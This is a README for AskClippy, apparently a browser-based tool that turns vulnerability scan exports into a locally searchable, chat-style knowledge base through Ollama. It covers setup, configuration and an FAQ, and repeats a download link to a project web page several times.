# AskClippy v2026 - offline AI knowledge pipeline 2026

> **AskClippy transforms vulnerability management exports into a local, browser-run knowledge pipeline, delivering chat-like answers through Ollama for offline and intranet deployments.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/felixlewis1990/askclippy-intranet-ai-hub?style=flat-square)](https://github.com/felixlewis1990/askclippy-intranet-ai-hub)

---

<p align="center">
  <a href="https://felixlewis1990.github.io/askclippy-intranet-ai-hub/">
    <img src="https://img.shields.io/badge/Download-AskClippy%20Latest-brightgreen?style=for-the-badge" alt="Download AskClippy">
  </a>
</p>

> **[Direct Download - AskClippy v2026](https://felixlewis1990.github.io/askclippy-intranet-ai-hub/)**

---

[Download Latest Build](https://felixlewis1990.github.io/askclippy-intranet-ai-hub/)

---

## What AskClippy Does

AskClippy is a browser-based way to turn vulnerability management exports into a searchable local knowledge layer. It accepts CSV and JSON scan data, keeps the content organized on your side, and makes exploration easier through conversational queries.

It is aimed at teams that need a private workflow with no reliance on external services for every request. Because it is built for offline-capable and intranet-oriented use, AskClippy fits air-gapped and restricted environments where scan output still needs to be reviewed efficiently.

---

## Capabilities

- Imports scan results from CSV and JSON files
- Supports offline-capable local search
- Connects to Ollama for private AI responses
- Runs in the browser for a simple web-based workflow
- Includes an animated Clippy assistant for guided interaction
- Fits air-gap and intranet environments
- Designed around a vulnerability management knowledge pipeline
- Helps convert scan output into chat-friendly answers

---

## Setup

1. Download or clone the repository.
2. Open the project in your preferred web hosting or local web server setup.
3. Make sure your scan exports are available in CSV or JSON format.
4. If you want AI responses, prepare a local Ollama instance before first use.

Example:

`git clone https://github.com/felixlewis1990/askclippy-intranet-ai-hub.git

Once that is done, start the web app from your local server or deployment target and load your dataset.

---

## How to Use It

1. Open AskClippy in a browser.
2. Import CSV or JSON output from your vulnerability management tool.
3. Search the ingested content locally.
4. Ask questions in chat form to explore the imported findings.
5. If configured, route prompts through Ollama for local model responses.

Typical workflow:

- Export scan data from your VM platform
- Load the file into AskClippy
- Review matches and context in the browser
- Ask follow-up questions to refine your analysis

---

## Configuration

What you configure depends on your deployment model and how the app connects to local services.

In most cases, these values live in the app's local deployment files or browser-side configuration. If Ollama is part of your setup, point AskClippy at the local Ollama endpoint used in your environment.

Example:

    {
      "ollamaEndpoint": "http://localhost:11434",
      "dataFormat": "csv",
      "mode": "offline"
    }

For internal hosting, keep the data source paths and model endpoint matched to your network layout.

---

## Requirements

- Web browser
- CSV or JSON scan exports
- Local storage or hosting for the web application
- Ollama for local AI responses, if enabled
- Network access only as needed for your deployment model
- Suitable environment for offline, air-gapped, or intranet use

---

## Common Questions

**Does AskClippy require an internet connection?**  
No. It is intended to work in offline-capable and intranet-friendly environments, depending on how you deploy it.

**What data formats does it accept?**  
It imports CSV and JSON scan data.

**How do I get AI-style answers?**  
Connect the app to a local Ollama instance so queries can be handled through your own environment.

**Where should I look if something is not loading?**  
Check the browser console, confirm the data file format, and verify that your local deployment and Ollama endpoint are reachable in your setup.

**How are updates handled?**  
Use the repository or release source associated with your deployment to pull the latest build when available.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
